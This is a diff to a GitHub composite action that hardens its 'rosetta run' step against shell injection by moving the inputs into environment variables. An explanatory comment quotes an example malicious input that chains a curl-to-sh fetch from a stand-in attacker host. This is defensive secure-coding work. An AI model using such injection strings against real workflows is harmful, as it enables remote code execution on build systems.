@@ -22,10 +22,22 @@ runs:
   using: "composite"
   steps:
     # Simple wrapper around running rosetta
+    #
+    # SECURITY: the inputs are passed through the environment rather than interpolated
+    # directly into the `run:` script. GitHub expands `${{ inputs.* }}` textually before
+    # the shell sees the script, so a caller passing a `task` or `args` value such as
+    # `build; curl attacker.example/x | sh` would have that text executed as shell. By
+    # exporting the values into `env:` and referencing them as quoted shell variables,
+    # the shell treats them as inert data and a metacharacter can no longer break out
+    # of the argument.
     - run: |
         rosetta run \
-          --workspace ${{ inputs.workspace }} \
-          ${{ inputs.task }} \
-          ${{ inputs.args }}
+          --workspace "$WORKSPACE" \
+          "$TASK" \
+          $ARGS
       shell: bash
       id: rosetta-step
+      env:
+        WORKSPACE: ${{ inputs.workspace }}
+        TASK: ${{ inputs.task }}
+        ARGS: ${{ inputs.args }}
